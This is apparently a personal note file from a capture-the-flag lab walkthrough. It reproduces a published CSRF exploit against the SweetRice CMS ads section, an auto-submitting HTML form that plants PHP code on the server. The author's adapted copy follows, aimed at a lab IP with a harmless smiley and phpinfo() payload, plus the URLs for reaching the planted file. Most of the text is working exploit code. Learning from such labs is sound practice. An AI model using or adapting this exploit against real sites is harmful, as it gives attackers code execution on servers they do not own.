@@ -1,0 +1,67 @@
+# !! This did not help in the walkthrough, but I did mention it, so here it's in the additional notes
+# ------------------------------------
+
+# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
+PHP Codes On Server .
+# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
+Code You Can
+Customize Exploit For Your Self .
+
+# Exploit :
+-->
+
+<html>
+<body onload="document.exploit.submit();">
+<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
+<input type="hidden" name="adk" value="hacked"/>
+<textarea type="hidden" name="adv">
+<?php
+echo '<h1> Hacked </h1>';
+phpinfo();?>
+&lt;/textarea&gt;
+</form>
+</body>
+</html>
+
+<!--
+# After HTML File Executed You Can Access Page In
+http://localhost/sweetrice/inc/ads/hacked.php
+  -->
+
+
+
+…
+
+My version: (saved as smile.html in nano)
+
+<html>
+<body onload="document.exploit.submit();">
+<form action="http://10.10.212.208/content/as/?type=ad&mode=save" method="POST" name="exploit">
+<input type="hidden" name="adk" value="hacked"/>
+<textarea type="hidden" name="adv">
+<?php
+echo '<h1> rember happy day </h1>     
+	<pre>
+         _____
+
+       /       \
+
+      |  O   O  |
+
+      |    ^    |
+
+       \  \___/ /
+
+        \_____/
+
+    	</pre>';
+phpinfo();?>
+&lt;/textarea&gt;
+</form>
+</body>
+</html>
+
+Access Page In
+http://10.10.212.208/sweetrice/inc/ads/hacked.php
+—> ?
+http://10.10.212.208/content/inc/ads/hacked.php
